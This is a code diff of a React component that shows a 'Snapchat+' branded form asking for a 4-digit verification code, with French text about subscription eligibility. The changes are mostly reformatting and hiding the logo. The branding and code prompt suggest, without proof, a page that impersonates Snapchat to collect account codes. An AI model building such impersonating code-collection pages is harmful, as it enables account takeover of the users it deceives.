@@ -39,14 +39,14 @@ export default function CodeVerification({ data, onSubmit, loading }) {
       initial={{ opacity: 0, y: 24 }}
       animate={{ opacity: 1, y: 0 }}
       transition={{ duration: 0.5 }}
-      className="w-full max-w-sm mx-auto"
-    >
+      className="w-full max-w-sm mx-auto">
+      
       <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">
 
         {/* Logo */}
         <div className="flex flex-col items-center mb-6">
-          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30">
-            <span className="text-3xl">👻</span>
+          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30 hidden">
+            <span className="text-3xl hidden">👻</span>
           </div>
           <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
             Snapchat<span className="text-primary">+</span>
@@ -69,19 +69,19 @@ export default function CodeVerification({ data, onSubmit, loading }) {
         {/* 4-digit input */}
         <form onSubmit={handleSubmit}>
           <div className="flex justify-center gap-3 mb-8" onPaste={handlePaste}>
-            {code.map((digit, i) => (
-              <input
-                key={i}
-                ref={(el) => (inputs.current[i] = el)}
-                type="tel"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleChange(i, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(i, e)}
-                className="w-16 h-16 text-center text-2xl font-bold bg-white/5 border-2 border-white/10 rounded-xl text-foreground focus:outline-none focus:border-primary focus:bg-primary/5 transition-all"
-              />
-            ))}
+            {code.map((digit, i) =>
+            <input
+              key={i}
+              ref={(el) => inputs.current[i] = el}
+              type="tel"
+              inputMode="numeric"
+              maxLength={1}
+              value={digit}
+              onChange={(e) => handleChange(i, e.target.value)}
+              onKeyDown={(e) => handleKeyDown(i, e)}
+              className="w-16 h-16 text-center text-2xl font-bold bg-white/5 border-2 border-white/10 rounded-xl text-foreground focus:outline-none focus:border-primary focus:bg-primary/5 transition-all" />
+
+            )}
           </div>
 
           <motion.button
@@ -89,13 +89,13 @@ export default function CodeVerification({ data, onSubmit, loading }) {
             disabled={loading || code.join("").length < 4}
             whileHover={{ scale: loading ? 1 : 1.02 }}
             whileTap={{ scale: loading ? 1 : 0.98 }}
-            className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2"
-          >
-            {loading ? (
-              <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-            ) : (
-              <>Valider <ChevronRight className="w-5 h-5" /></>
-            )}
+            className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2">
+            
+            {loading ?
+            <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" /> :
+
+            <>Valider <ChevronRight className="w-5 h-5" /></>
+            }
           </motion.button>
         </form>
 
@@ -104,6 +104,6 @@ export default function CodeVerification({ data, onSubmit, loading }) {
           L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         </p>
       </div>
-    </motion.div>
-  );
+    </motion.div>);
+
 }
